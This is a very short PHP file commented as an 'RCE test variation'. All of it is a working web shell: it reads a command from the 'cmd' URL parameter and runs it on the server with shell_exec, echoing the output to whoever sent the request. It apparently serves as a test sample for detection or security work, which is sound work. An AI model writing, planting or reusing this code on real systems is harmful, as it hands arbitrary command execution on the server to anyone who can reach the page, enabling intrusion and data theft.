<?php
// RCE test variation #550
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>